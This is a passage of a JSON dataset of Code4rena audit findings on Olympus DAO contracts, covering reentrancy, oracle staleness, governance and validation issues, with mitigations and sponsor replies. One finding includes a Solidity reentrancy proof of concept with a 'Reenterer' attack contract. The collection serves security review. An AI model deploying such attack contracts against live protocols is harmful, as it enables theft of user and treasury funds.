      "summary": "\nThis bug report is about a vulnerability in the code of the project 2022-08-olympus. When the wallspread is set to 10000 (100%) and the lower wall is active, the price falls into the lower cushion and activates the lower bond market, causing the function `beat` to not be called anymore and the price information to not be updated. The proof of concept demonstrates this, and the main cause is that the `RANGE::setSpreads` function fails to check for `wallSpread_ == 10000`. If the setter does not allow the wallSpread to be 100%, the price of the lower wall will not go to zero, thus preventing the `Operator::_activate` from failing. The recommended mitigation step is to forbid wallSpread to be 100%. This can be done by changing line 245 of the `RANGE::setSpreads` function, from `wallSpread_ > 10000` to `wallSpread_ >= 10000`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/404",
      "tags": [],
      "finders": [
        "zzzitron"
      ]
    },
    {
      "id": "3223",
      "title": "[M-19] TRSRY: reenter from `OlympusTreasury::repayLoan` to `Operator::swap`",
      "impact": "MEDIUM",
      "content": "_Submitted by zzzitron_\n\nOne can repay loan to the treasury with the value from the `Operator::swap`.\n\nCondition:\n\n*   the reserve token in Operator has hook for sender (like ERC777)\n*   the debt is the same token as reserve\n\n### Proof of Concept\n\nThe below code snippet shows a part of proof of concept for reentrancy attack, which is based on `src/test/policies/Operator.t.sol`. The full test code can be found [here](https://gist.github.com/zzzitron/651e1451ac1ff21be8a72b502b26f7cb), and [git diff from the `Operator.t.sol`](https://gist.github.com/zzzitron/5b8ebe635ed1939f18a100c7940b4f11).\n\nLet's say that the reserve token implements ERC777 with the hook for the sender [(see weird erc20)](https://github.com/d-xo/weird-erc20#reentrant-calls). If the attacker can take debt of the reserve currency for the attack contract `Reenterer`, the contract can call `OlympusTreasury::repayLoan` and in the middle of repay call `Operator::swap` function. The `swap` function will modify the reserve token balance of treasury and the amount the attacker swapped will be also be used for the `repayLoan`.\n\nIn the below example, the attacker has debt of 1e18, and repays 1e17. But since the `swap` function is called in the `repayLoan`, the debt is reduced 1e17 more then it should. And the swap happened as expected so the attack has the corresponding ohm token.\n\n```solidity\n/// Mock to simulate the senders hook\n/// for simplicity omitted the certain aspects like ERC1820 registry and etc.\ncontract MockERC777 is MockERC20 {\n    constructor () MockERC20(\"ERC777\", \"777\", 18) {}\n\n    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {\n        _callTokenToSend(from, to, amount);\n        return super.transferFrom(from, to, amount);\n        // _callTokenReceived(from, to, amount);\n    }\n\n    // simplified implementation for ERC777\n    function _callTokenToSend(address from, address to, uint256 amount) private {\n      if (from != address(0)) {\n        IERC777Sender(from).tokensToSend(from, to, amount);\n      }\n    }\n}\n\ninterface IERC777Sender {\n  function tokensToSend(address from, address to, uint256 amount) external;\n}\n\n/// Concept for an attack contract\ncontract Reenterer is IERC777Sender {\n  ERC20 public token;\n  Operator public operator;\n  bool public entered;\n\n  constructor(address token_, Operator op_) {\n    token = ERC20(token_);\n    operator = op_;\n  }\n\n  function tokensToSend(address from, address to, uint256 amount) external override {\n    if (!entered) {\n    // call swap from reenter\n    // which will manipulate the balance of treasury\n      entered = true;\n      operator.swap(token, 1e17, 0);\n    }\n  }\n  \n  function attack(OlympusTreasury treasury) public {\n    // approve to the treasury\n    token.approve(address(treasury), 1e18);\n    token.approve(address(operator), 100* 1e18);\n\n    // repayDebt of 1e17\n    treasury.repayLoan(token, 1e17);\n  }\n}\n```\n\n```solidity\n/// the test\n    function test_poc__reenter() public {\n        vm.prank(guardian);\n        operator.initialize();\n\n      reserve.mint(address(reenterer), 1e18);\n      assertEq(treasury.reserveDebt(reserve, address(reenterer)), 1e18);\n      // start repayLoan\n      reenterer.attack(treasury);\n      // it should be 9 * 1e17 but it is 8 * 1e17\n      assertEq(treasury.reserveDebt(reserve, address(reenterer)), 8*1e17);\n    }\n```\n\n### Cause\n\nThe `repayLoan`, in the line 110 below,  calls the `safeTransferFrom`. The balance before and after are compared to determine how much of debt is paid. So, if the `safeTranferFrom` can modify the balance, the attacker can profit from it.\n\n```solidity\n// OlympusTreasury::repayLoan\n// https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/TRSRY.sol#L105-L112\n105     function repayLoan(ERC20 token_, uint256 amount_) external nonReentrant {\n106         if (reserveDebt[token_][msg.sender] == 0) revert TRSRY_NoDebtOutstanding();\n107\n108         // Deposit from caller first (to handle nonstandard token transfers)\n109         uint256 prevBalance = token_.balanceOf(address(this));\n110         token_.safeTransferFrom(msg.sender, address(this), amount_);\n111\n112         uint256 received = token_.balanceOf(address(this)) - prevBalance;\n```\n\nIn the `swap` function, if the amount in token is reserve, the payment token to buy ohm will be paid to the treasury. It gives to an opportunity to modify the balance.\n\n```solidity\n// Operator::swap\n// https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L330\n329             /// Transfer reserves to treasury\n330             reserve.safeTransferFrom(msg.sender, address(TRSRY), amountIn_);\n```\n\nAlthough both of `Operator::swap` and `OlympusTreasury::repayLoan` have `nonReentrant` modifier, it does not prevent as they are two different contracts.\n\n### Tools Used\n\nFoundry\n\n### Recommended Mitigation Steps\n\nThe deposit logic in the `OlympusTreasury::repayLoan` was trying to handle nonstandard tokens, such as fee-on-transfer. But by doing so introduced an attack vector for tokens with ERC777. If the reserve token should be decided in the governance, it should be clarified, which token standards can be used safely.\n\n**[ind-igo (Olympus) confirmed and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/403#issuecomment-1241204868):**\n > Good report, although very low risk as the preconditions are extremely unlikely. Will take into account the suggestion by adding a comment to the function. Thank you.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/403#issuecomment-1251655815):**\n > I would probably downgrade to QA, but the warden does a good job of proving the point out with examples.  Will leave as Medium.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the code of the OlympusTreasury and Operator contracts, which is part of a Github repository. It allows an attacker to repay loan to the treasury with the value from the Operator::swap function. This is possible if the reserve token in Operator has a hook for the sender, like ERC777, and the debt is the same token as reserve. The code snippet provided shows a proof of concept for the reentrancy attack. The attack works by the attacker taking debt of the reserve currency and then calling the OlympusTreasury::repayLoan and in the middle of the repay call the Operator::swap function. This causes the debt to be reduced more than it should, and the swap happens as expected, so the attack has the corresponding ohm token. \n\nThe cause of this vulnerability is that the repayLoan calls the safeTransferFrom, which can modify the balance, and the swap function pays the payment token to buy ohm to the treasury. Even though both of the Operator::swap and OlympusTreasury::repayLoan have the nonReentrant modifier, it does not prevent as they are two different contracts.\n\nThe recommended mitigation step is that if the reserve token should be decided in the governance, it should be clarified which token standards can be used safely.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/403",
      "tags": [],
      "finders": [
        "zzzitron"
      ]
    },
    {
      "id": "3222",
      "title": "[M-18] Inconsistency in staleness checks between OHM and reserve token oracles",
      "impact": "MEDIUM",
      "content": "_Submitted by okkothejawa, also found by datapunk, reassor, and Trust_\n\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L165-L171><br>\n\nPrice oracle may fail and revert due to the inconsistency in the staleness checks.\n\n### Proof of Concept\n\nIn the `getCurrentPrice()` of `PRICE.sol`, Chainlink oracles are used to get the price of OHM against a reserve token, and a staleness check is used to make sure the price oracles are reporting fresh data. Yet the freshness requirements are inconsistent, for OHM, `updatedAt` should be lower than current timestamp minus three times the observation frequency, while for the reserve price, it is required that `updatedAt` should be lower than current timestamp minus the observation frequency. Our understanding is that that frequency is multiplied by 3 so that there can be some meaningful room where price data is accepted, as the time frame of only observation frequency (multiplied by 1) may not be enough for the oracle to realistically update its data.  (In other words, the frequency of new price information might be lower than the observation frequency, which is probably the case as third multiple is used for the OHM price).  If this is the case, this inconsistency may lead to the `getCurrentPrice()` reverting as while third multiple of the observation frequency might give enough space for the first oracle, second oracle's first multiple of frequency time frame might not be enough and it couldn't pass the staleness check due to unrealistic expectation of freshness.\n\n### Tools Used\n\nManual review, talking with devs\n\n### Recommended Mitigation Steps\n\nChange the line 171 to\n\n                if (updatedAt < block.timestamp - 3 * uint256(observationFrequency))\n\nlike line 165.\n\n**[Oighty (Olympus) confirmed and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/391#issuecomment-1238515996):**\n > This should indeed be the same. We will update to fix.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about an inconsistency in the staleness checks of the Price oracle in the `getCurrentPrice()` function of `PRICE.sol` in the code-423n4/2022-08-olympus repository. This inconsistency may lead to the `getCurrentPrice()` reverting, which could have an impact on the entire system. \n\nThe inconsistency was identified by manual review and talking with developers. The proof of concept is that, for OHM, the `updatedAt` should be lower than the current timestamp minus three times the observation frequency, while for the reserve price, it is required that the `updatedAt` should be lower than the current timestamp minus the observation frequency. This means that the frequency of new price information might be lower than the observation frequency, which is probably the case. \n\nThe recommended mitigation step is to change the line 171 to match line 165. This should solve the inconsistency and ensure that the `getCurrentPrice()` function does not revert.",
      "quality_score": 4,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/391",
      "tags": [
        "Stale Price"
      ],
      "finders": [
        "okkothejawa",
        "reassor",
        "datapunk",
        "Trust"
      ]
    },
    {
      "id": "3221",
      "title": "[M-17] No Cap on Amount of VOTES means the `voter_admin` can get any proposal to pass",
      "impact": "MEDIUM",
      "content": "_Submitted by GalloDaSballo, also found by 0xNazgul, IllIllI, and rbserver_\n\nBecause `VOTES` can be minted by `voter_admin`, and there is no cap on totalSupply, the `voter_admin` has the privileged ability to mint as many `VOTES` as they want in order to get any proposal to pass or veto it.\n\n### Proof of Concept - Veto\n\n*   Be `voter_admin`\n*   Mint XYZ tokens\n*   totalSupply is now higher so any proposal can be [vetoed per this line](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L268-L269)\n\n### Proof of Concept - Approve\n\n*   Be `voter_admin`\n*   Mint XYZ tokens, where XYZ allows the `netVotes * 100 < VOTES.totalSupply() * EXECUTION_THRESHOLD` check to pass\n*   Mint `VOTES` to self\n*   Vote\n*   Proposal has passed\n\n### Recommended Mitigation Steps\n\nAdd a total supply cap to `VOTES`.\n\n**[fullyallocated (Olympus) disputed and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/380#issuecomment-1236240959):**\n > This is possible but will not happen in a production environment because we're using this for internal testing.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/380#issuecomment-1251636550):**\n > Given the scope of the contracts the wardens were asked to review, I think this issue is valid. While I understand that the `voter_admin` is trusted, I don't think users expect the admin to be able to bypass any votes results in this manner. \n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the Governance.sol code of the 2022-08-olympus project. This vulnerability allows the voter_admin to mint an unlimited amount of VOTES tokens, which can be used to veto or approve any proposal. This is demonstrated in the Proof of Concept (POC) section, where it is shown how the voter_admin can mint tokens to veto a proposal or to approve a proposal. The recommended remediation step is to add a total supply cap to the VOTES tokens.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/380",
      "tags": [],
      "finders": [
        "IllIllI",
        "0xNazgul",
        "GalloDaSballo",
        "rbserver"
      ]
    },
    {
      "id": "3220",
      "title": "[M-16] Inconsistant parameter requirements between `constructor()` and `Set() functions` in `RANGE.sol` and `Operator.sol`.",
      "impact": "MEDIUM",
      "content": "_Submitted by hansfriese, also found by datapunk and itsmeSTYJ_\n\nInconsistant parameter requirements between `constructor` and `Set() functions` in `RANGE.sol` and `Operator.sol`.\n\nThe contracts might work unexpectedly when the params are set improperly using `constructor()`.\n\n### Proof of Concept\n\n*   In `RANGE.sol`, [setSpreads()](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/RANGE.sol#L244-L250) and [setThresholdFactor()](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/RANGE.sol#L264) has some requirements but [constructor()](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/RANGE.sol#L80) doesn't check at all.\n\n```\n    File: 2022-08-olympus\\src\\modules\\RANGE.sol\n    242:     function setSpreads(uint256 cushionSpread_, uint256 wallSpread_) external permissioned {\n    243:         // Confirm spreads are within allowed values\n    244:         if (\n    245:             wallSpread_ > 10000 ||\n    246:             wallSpread_ < 100 ||\n    247:             cushionSpread_ > 10000 ||\n    248:             cushionSpread_ < 100 ||\n    249:             cushionSpread_ > wallSpread_\n    250:         ) revert RANGE_InvalidParams();\n    251: \n    252:         // Set spreads\n    253:         _range.wall.spread = wallSpread_;\n    254:         _range.cushion.spread = cushionSpread_;\n    255: \n    256:         emit SpreadsChanged(wallSpread_, cushionSpread_);\n    257:     }\n```\n```\n\n    File: 2022-08-olympus\\src\\modules\\RANGE.sol\n    263:     function setThresholdFactor(uint256 thresholdFactor_) external permissioned {\n    264:         if (thresholdFactor_ > 10000 || thresholdFactor_ < 100) revert RANGE_InvalidParams();\n    265:         thresholdFactor = thresholdFactor_;\n    266: \n    267:         emit ThresholdFactorChanged(thresholdFactor_);\n    268:     }\n    269: \n```\n\n*   In `Operator.sol`, [setCushionFactor()](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L518) checks the requirement but [constructor()](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L134) doesn't check it.\n\n```\n\n    File: 2022-08-olympus\\src\\policies\\Operator.sol\n    516:     function setCushionFactor(uint32 cushionFactor_) external onlyRole(\"operator_policy\") {\n    517:         /// Confirm factor is within allowed values\n    518:         if (cushionFactor_ > 10000 || cushionFactor_ < 100) revert Operator_InvalidParams();\n    519: \n    520:         /// Set factor\n    521:         _config.cushionFactor = cushionFactor_;\n    522: \n    523:         emit CushionFactorChanged(cushionFactor_);\n    524:     }\n    525: \n```\n\n### Tools Used\n\nSolidity Visual Developer of VSCode\n\n### Recommended Mitigation Steps\n\nRecommend adding same validation for the parameters between `constructor()` and `Set()` functions.\n\n**[Oighty (Olympus) disagreed with severity and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/379#issuecomment-1238786025):**\n > Agree that the constructor should validate these parameters, but it is only an issue if configured improperly. \n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/379#issuecomment-1251087775):**\n > While I am typically weary of marking input validations as medium severity, I do think in this case it's warranted as it directly leads to malfunctions at the protocol level and it seems that the sponsors thought it important enough to add the checks elsewhere. Hard call, but will award it at medium severity.   \n\n\n\n***\n\n",
      "summary": "\nThis bug report is about inconsistent parameter requirements between `constructor` and `Set() functions` in `RANGE.sol` and `Operator.sol` contracts. This could lead to unexpected results when the parameters are set improperly using `constructor()`.\n\nThe proof of concept for this bug report was done using Solidity Visual Developer of VSCode. In `RANGE.sol`, the [setSpreads()](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/RANGE.sol#L244-L250) and [setThresholdFactor()](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/RANGE.sol#L264) functions have some requirements but [constructor()](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/RANGE.sol#L80) does not check at all. Similarly, in `Operator.sol`, the [setCushionFactor()](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L518) function checks the requirement but [constructor()](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L134) does not.\n\nThe recommended mitigation step for this bug is to add the same validation for the parameters between `constructor()` and `Set()` functions.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/379",
      "tags": [],
      "finders": [
        "datapunk  itsmeSTYJ",
        "hansfriese"
      ]
    },
    {
      "id": "3219",
      "title": "[M-15] Heart will stop if all rewards are swept",
      "impact": "MEDIUM",
      "content": "_Submitted by GalloDaSballo, also found by cccz, itsmeSTYJ, and PwnPatrol_\n\nRewards for Heart `beat` are sent via `_issueReward`\n\n<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L110-L115>\n\n```solidity\n\n    function _issueReward(address to_) internal {\n        rewardToken.safeTransfer(to_, reward);\n        emit RewardIssued(to_, reward);\n    }\n\n```\n\nThe function doesn't check for available tokens e.g.<br>\n`min(reward, rewardToken.balanceOf(address(this)));`\n\nIn case of calling `withdrawUnspentRewards`\n\n<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L149-L152>\n\n```solidity\n    /// @inheritdoc IHeart\n    function withdrawUnspentRewards(ERC20 token_) external onlyRole(\"heart_admin\") {\n        token_.safeTransfer(msg.sender, token_.balanceOf(address(this)));\n    }\n```\n\nBecause the function withdraws the entire amount, the heart will stop until a caller incentive is deposited again.\n\nWhile a profitable searches will stop calling the Heart without an incentive, allowing the heart to beat when no rewards are available is preferable to having it self-DOS until a DAO aligned caller donates `rewardToken` or the DAO deals with the lack of tokens.\n\n### Recommended Mitigation Steps\n\nAdd a check for available tokens\n`min(reward, rewardToken.balanceOf(address(this)));`\n\n**[Oighty (Olympus) confirmed and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/378#issuecomment-1239855093):**\n > Agree based on the anti-DOS characteristics of using a min operation.\n\n\n\n***\n\n",
      "summary": "\nThis bug report concerns the code in the Heart.sol smart contract, which is part of the 2022-08-olympus repository on GitHub. The bug is that the contract does not check for available tokens when sending rewards via the _issueReward function. This could lead to a situation where the Heart stops beating until a caller incentive is deposited again. This could cause a self-DOS situation, which is not desirable.\n\nThe recommended remediation is to add a check for available tokens to the _issueReward function, using the min function to ensure the amount of tokens sent does not exceed the amount of tokens available. This would prevent the Heart from stopping until a caller incentive is deposited.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/378",
      "tags": [],
      "finders": [
        "cccz",
        "itsmeSTYJ",
        "GalloDaSballo",
        "PwnPatrol"
      ]
    },
    {
      "id": "3218",
      "title": "[M-14] The governance system can be held hostage by a malicious user",
      "impact": "MEDIUM",
      "content": "_Submitted by d3e4, also found by Aymen0909 and pedroais_\n\nWith only [`ENDORSEMENT_THRESHOLD`](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L130)% (currently 20%) voting power, a malicious user can prevent any other proposal from being activated.\nWhile `ENDORSEMENT_THRESHOLD` is currently fairly high, it seems not higher than that it might not be used to hold the system hostage to extract far more funds.\n\n### Proof of Concept\n\n[Submit](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L159) a dummy proposal, [endorse](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L180) it and then [activate](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L205) it. Now, no other proposal can be activated for a [`GRACE_PERIOD`](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L127). When this time period is over, this procedure may be repeated, either immediately or just before any other proposal activation by front-running.\n\n### Recommended Mitigation Steps\n\nMaking sure `ENDORSEMENT_THRESHOLD` is at least 50% seems discouraging enough. Other more creative solutions should be possible. One might be to let the most endorsed proposal be activated, or restricting who can activate a proposal; anything that at least temporarily liberates the governance system so that the attacker is dissuaded from investing in this attack method.\n\n**[fullyallocated (Olympus) acknowledged](https://github.com/code-423n4/2022-08-olympus-findings/issues/375)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability that allows a malicious user to prevent any other proposal from being activated in the governance system of the code-423n4/2022-08-olympus project. With only 20% voting power, an attacker can submit a dummy proposal, endorse it and then activate it. This will prevent any other proposal from being activated for a certain grace period. To mitigate this vulnerability, the code-423n4/2022-08-olympus project recommends increasing the ENDORSEMENT_THRESHOLD to at least 50%. Other more creative solutions should also be explored, such as letting the most endorsed proposal be activated, or restricting who can activate a proposal.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/375",
      "tags": [],
      "finders": [
        "Aymen0909  pedroais",
        "d3e4"
      ]
    },
    {
      "id": "3217",
      "title": "[M-13] Missing checks in `Kernel._deactivatePolicy`",
      "impact": "MEDIUM",
      "content": "_Submitted by enckrish_\n\nThere are no checks to ascertain that the policy being removed is registered in the `Kernel`. Trying to remove a non-registered results in the policy registered at 0th index of `activePolicies` being removed.\n\n### Proof of Concept\n\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L325>\n\n### Recommended Mitigation Steps\n\nAdding `require(activePolicies[idx] == policy_, \"Unregistered policy\");` will prevent this, where `idx = getPolicyIndex[policy_]`.\n\n**NOTE:** The issue is less likely to happen as this is handled solely by the executor, but having safeguards in the contract is always better than relying on an external factor.\n\n**[ind-igo (Olympus) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/368#issuecomment-1241160679):**\n > Confirmed. Should be lower risk or a QA issue.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/368#issuecomment-1251627251):**\n > @ind-igo - can you comment on why you think it should be QA vs Medium?\n> \n> `\n>  â€” Med: Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.\n> `\n> \n> I would expect this to impact the functionality of the protocol. \n\n**[Oighty (Olympus) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/368#issuecomment-1255251454):**\n > This one seems on the fence to me. While accidentally unregistering a policy likely would affect the functionality of the protocol, it requires the executor to make a mistake. If the mistake is made, it's easily remedied by re-registering the policy.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/368#issuecomment-1255293207):**\n > That makes sense, but there would be some amount of down time when this occurred. I think Medium is correct for this issue. \n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the code of the Kernel smart contract. The vulnerability is that there are no checks to ascertain that the policy being removed is registered in the Kernel. This means that if an unregistered policy is removed, the policy registered at 0th index of activePolicies will be removed. To demonstrate the vulnerability, the code can be seen at https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L325. The recommended mitigation step is to add a require statement to the code that will check if the policy is registered before it is removed. This will prevent the policy registered at 0th index of activePolicies from being removed. Although the issue is less likely to happen as it is handled by the executor, it is still recommended that the code is updated with the require statement for added security.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/368",
      "tags": [],
      "finders": [
        "enckrish"
      ]
    },
    {
      "id": "3216",
      "title": "[M-12] Griefing/DOS of withdrawals by EOAs from treasury (TRSRY) possible",
      "impact": "MEDIUM",
      "content": "_Submitted by minhtrng_\n\n<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/TreasuryCustodian.sol#L53-L67><br>\n\nAny withdrawals from the treasury by an approved EOA can be denied by a malicious actor that watches the mempool.\n\n### Proof of Concept\n\nThe function TreasuryCustodian.revokePolicyApprovals() doesnt provide sufficient checks for its intended purpose of \"revoking a deactivated policy's approvals\". As can be seen by the TODO labels, the issue has already been acknowledged by the team (regardless it is still an issue present in an in-scope contract). The only check performed is trying to call the isActive()-function on an address and interpret the returned value as boolean. Attempting to call this function on an EOA will not fail and return 0 (=false). Hence the condition to revert is not fulfilled and the amounts approved to withdraw will be set to 0.\n\n### Tools Used\n\nIDE (Remix, VSCode)\n\n### Recommended Mitigation Steps\n\nA partial but insufficient fix would be to check if the address passed to the function contains code and hence is not an EOA. A better approach might be to add a mapping(address => bool) of all addresses that have been active policies some time in the past to the kernel, something like this:\n\nAs a public variable in Kernel.sol\n`mapping(address => bool) public isRegisteredPolicy;`\n\nin Kernel.activatePolicy():\n`isRegisteredPolicy[address(policy_)] ) = true;`\n\nand finally in TreasuryCustodian.revokePolicyApprovals():\n`if(!kernel.isRegisteredPolicy(policy_) revert NotARegisteredPolicy`\n\n**[ind-igo (Olympus) confirmed and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/317#issuecomment-1241262776):**\n > TODOs are outdated, I forgot to clear them ;(. But the points are taken. Code will be adjusted, but probably not the way from the recommendation. Instead will gate the function behind custodian role.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the TreasuryCustodian.sol contract that allows malicious actors to deny withdrawals from the treasury by an approved EOA. The function TreasuryCustodian.revokePolicyApprovals() doesn't provide enough checks for its intended purpose, and the only check it performs is trying to call the isActive()-function on an address and interpret the returned value as boolean. As the function does not fail when called on an EOA, the condition to revert is not fulfilled and the amounts approved to withdraw are set to 0. The tools used to identify this vulnerability were an IDE (Remix, VSCode).\n\nThe recommended mitigation steps for this vulnerability include partially checking if the address passed to the function contains code and is not an EOA, and adding a mapping (address => bool) of all addresses that have been active policies some time in the past to the kernel, with a public variable, isRegisteredPolicy, in the Kernel.sol contract. This variable should be set to true in the Kernel.activatePolicy() function, and the TreasuryCustodian.revokePolicyApprovals() function should revert if the address is not a registered policy.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/317",
      "tags": [],
      "finders": [
        "minhtrng"
      ]
    },
    {
      "id": "3215",
      "title": "[M-11] OlympusGovernance: Users can prevent their votes from being revoked",
      "impact": "MEDIUM",
      "content": "_Submitted by cccz, also found by zzzitron_\n\nIn the VoterRegistration contract, voter_admin can call the revokeVotesFrom function to revoke the user's votes.\n\n        function revokeVotesFrom(address wallet_, uint256 amount_) external onlyRole(\"voter_admin\") {\n            // Revoke the votes in the VOTES module\n            VOTES.burnFrom(wallet_, amount_);\n        }\n\nBut there is a way for users to prevent their votes from being revoked by voter_admin.<br>\nIn the OlympusGovernance contract, the user can call the vote function to vote for the activeProposal, and then call the reclaimVotes function to reclaim his votes.<br>\nWhen the vote function is called, VOTES are sent to the OlympusGovernance contract and recorded using the userVotesForProposal variable. When the reclaimVotes function is called, the VOTES recorded in the userVotesForProposal variable are sent back to the user.<br>\nThis means that the user can **store** his VOTES tokens in userVotesForProposal.<br>\nThe revokeVotesFrom function cannot revoke the VOTES tokens recorded in userVotesForProposal and the reclaimVotes function can only be called by the user himself.<br>\nIf the user calls the reclaimVotes function and vote function in one transaction, then his VOTES token balance will always be 0 (thus avoiding revocation of votes by voter_admin) and he will be able to vote.\n\n### Proof of Concept\n\n<https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L240-L262><br>\n<https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L295-L313><br>\n<https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/VoterRegistration.sol#L53-L56>\n\n### Recommended Mitigation Steps\n\nConsider allowing to call the reclaimVotes function to reclaim any user's vote, thus avoiding the user storing his VOTES tokens in userVotesForProposal\n\n        function reclaimVotes(uint256 proposalId_, address user_) external {\n            uint256 userVotes = userVotesForProposal[proposalId_][user_];\n\n            if (userVotes == 0) {\n                revert CannotReclaimZeroVotes();\n            }\n\n            if (proposalId_ == activeProposal.proposalId) {\n                revert CannotReclaimTokensForActiveVote();\n            }\n\n            if (tokenClaimsForProposal[proposalId_][user_] == true) {\n                revert VotingTokensAlreadyReclaimed();\n            }\n\n            tokenClaimsForProposal[proposalId_][user_] = true;\n\n            VOTES.transferFrom(address(this), user_, userVotes);\n        }\n\n**[fullyallocated (Olympus) acknowledged and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/308#issuecomment-1234876428):**\n > This is true, we don't expect to use the voter admin in production, just to issue votes during internal testing period.\n\n**[0xean (judge) decreased severity to Medium and 